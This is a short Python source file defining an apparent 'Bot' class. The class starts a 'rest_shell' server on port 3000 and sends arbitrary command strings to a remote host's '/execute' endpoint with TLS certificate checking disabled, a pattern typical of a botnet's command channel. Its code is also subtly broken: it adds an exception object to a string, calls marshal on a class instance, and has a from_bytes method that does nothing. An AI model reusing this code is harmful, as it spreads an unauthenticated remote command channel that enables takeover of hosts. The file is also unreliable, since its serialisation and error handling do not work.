from src.common.commondefs import false
from src.common.commondefs import true
from src.common.commondefs import none
import rest_shell
import marshal
import sys
import os
import requests
import simplejson as json
import threading

class ImportTest:
    def __init__(self):
        print("imported successfully") # Log success
class Bot:
    # init class instance
    def __init__(self, host):
        print('-- INFO -- initializing bot...')

        self.host = host # Fetch and store host reference

    # open rest gateway to bot
    def rest(self):
        print('-- REST -- starting rest server...')
        try:
            rest_shell.run(':3000') # Start rest server
        except Exception as e:
            print('-- CONNECTION -- connection failure: ' + e)

    # sending a command to the client
    def send_command(self, command):
        try:
            print('\nattempting on host '+self.host+'\n')
            url = "https://"+self.host+":3000/execute" # Get addr

            data = {'command': command} # Set request data
            headers = {'Content-Type': 'application/json'} # Init request headers
            r = requests.post(url, data=json.dumps(data), headers=headers, verify=false) # Send request

            return r.json() # Return response
        except Exception:
            print('client refused connection')

    # dump to bytes
    def to_bytes(self):
        return marshal.dumps(self)

    # dump params to bytes
    def params_to_bytes(self):
        arr = [self.host]
        return marshal.dumps(arr)

    # read from bytes
    def from_bytes(self, b):
        self = marshal.loads(b)

def byte_params_to_bot(b):
    arrVal = marshal.loads(b)
    return Bot(arrVal[0])